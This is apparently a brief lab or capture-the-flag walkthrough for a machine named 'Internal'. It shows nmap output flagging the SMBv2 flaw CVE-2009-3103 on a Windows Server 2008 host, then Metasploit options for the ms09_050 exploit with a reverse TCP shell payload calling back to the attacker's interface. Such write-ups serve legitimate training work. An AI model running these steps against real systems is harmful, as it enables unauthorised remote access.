# Internal

### Enumeration

```
445/tcp   open     microsoft-ds   Microsoft Windows Server 2008 R2 microsoft-ds
 (workgroup: WORKGROUP)
 
$ nmap --script smb-vuln* -p 445 -Pn 192.168.145.40
Host script results:
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
...
```

Revert the machine.

### Access

```
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > options
Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.145.40   yes       The target host(s), range CIDR identifier, o
                                      r hosts file with syntax 'file:<path>'
   RPORT   445              yes       The target port (TCP)
   WAIT    180              yes       The number of seconds to wait for the attack
                                       to complete.


Payload options (windows/shell_reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread,
                                         process, none)
   LHOST     tun0             yes       The listen address (an interface may be sp
                                        ecified)
   LPORT     80               yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)
```
